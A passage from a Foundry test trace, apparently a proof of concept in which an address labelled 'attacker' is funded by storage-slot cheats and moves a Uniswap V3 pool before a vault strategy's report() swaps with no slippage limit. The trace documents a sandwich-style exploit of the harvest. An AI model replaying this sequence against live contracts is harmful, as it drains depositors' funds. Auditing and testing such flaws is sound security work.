    │   └─ ← [Return] 32490961812705 [3.249e13]
    ├─ [0] VM::revertTo(0)
    │   └─ ← [Return] true
    ├─ [2374] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSell() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2566] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSellMapping(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] 0
    ├─ [9664] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::decimals() [staticcall]
    │   ├─ [2460] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::decimals() [delegatecall]
    │   │   └─ ← [Return] 18
    │   └─ ← [Return] 18
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x04f2f6350d549d0b09e534b5449b3e137ced476ed49ffeff61284a278d4cde74, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x00000000000000000000000000000000000000000000003635c9adc5dea00000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 500000000000000000000 [5e20]
    │   └─ ← [Return] 500000000000000000000 [5e20]
    ├─ [9642] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::decimals() [staticcall]
    │   ├─ [2438] 0x5e875267f65537768435C3C6C81cd313a570B422::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ [3486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x000000000000000000000000000000000000000000000000000000003b9aca00)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 1000000000 [1e9]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [5408] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [2507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 30573573712348 [3.057e13]
    │   └─ ← [Return] 30573573712348 [3.057e13]
    ├─ [2742] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::uniFees(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36) [staticcall]
    │   └─ ← [Return] 500
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [27318] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [26608] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [5769486] 0x4e1d81A3E627b9294532e990109e4c21d217376C::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, tokenOut: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fee: 500, recipient: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, deadline: 1764328298 [1.764e9], amountIn: 500000000000000000000 [5e20], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [5762025] 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B::swap(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], false, 500000000000000000000 [5e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   ├─ [11013] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1323207628150 [1.323e12])
    │   │   │   ├─ [10282] 0x5e875267f65537768435C3C6C81cd313a570B422::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1323207628150 [1.323e12]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 1323207628150 [1.323e12])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   └─ ← [Return] 1520324023841535647786 [1.52e21]
    │   │   │   └─ ← [Return] 1520324023841535647786 [1.52e21]
    │   │   ├─ [11017] 0x4e1d81A3E627b9294532e990109e4c21d217376C::uniswapV3SwapCallback(-1323207628150 [-1.323e12], 500000000000000000000 [5e20], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   ├─ [6915] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::transferFrom(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 500000000000000000000 [5e20])
    │   │   │   │   ├─ [6199] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::transferFrom(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 500000000000000000000 [5e20]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, value: 500000000000000000000 [5e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   └─ ← [Return] 2020324023841535647786 [2.02e21]
    │   │   │   └─ ← [Return] 2020324023841535647786 [2.02e21]
    │   │   ├─ emit Swap(param0: 0x4e1d81A3E627b9294532e990109e4c21d217376C, param1: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], param2: -1323207628150 [-1.323e12], param3: 500000000000000000000 [5e20], param4: 1772988584226120341235462883190546 [1.772e33], param5: 35526775211686097 [3.552e16], param6: 200326 [2.003e5])
    │   │   └─ ← [Return] 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffecbeaadea8a00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
    │   └─ ← [Return] 1323207628150 [1.323e12]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(0xC29cbdcf5843f8550530cc5d627e1dd3007EF231)
    │   └─ ← [Return]
    ├─ [2411975] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::report()
    │   ├─ [2411571] 0xD377919FA87120584B21279a491F82D5265A139c::report() [delegatecall]
    │   │   ├─ [2367609] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::harvestAndReport()
    │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   ├─ [3989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [3258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [3318] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0)
    │   │   │   │   ├─ [2608] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [1258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [23218] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ [22508] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1860223] 0x4e1d81A3E627b9294532e990109e4c21d217376C::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, tokenOut: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fee: 500, recipient: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, deadline: 1764328298 [1.764e9], amountIn: 1000000000000000000000 [1e21], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   │   │   │   ├─ [1855262] 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B::swap(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, false, 1000000000000000000000 [1e21], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [26113] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 837621800680 [8.376e11])
    │   │   │   │   │   │   ├─ [25382] 0x5e875267f65537768435C3C6C81cd313a570B422::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 837621800680 [8.376e11]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 837621800680 [8.376e11])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 2020324023841535647786 [2.02e21]
    │   │   │   │   │   │   └─ ← [Return] 2020324023841535647786 [2.02e21]
    │   │   │   │   │   ├─ [8599] 0x4e1d81A3E627b9294532e990109e4c21d217376C::uniswapV3SwapCallback(-837621800680 [-8.376e11], 1000000000000000000000 [1e21], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   │   │   │   ├─ [4497] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   ├─ [3781] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21]) [delegatecall]
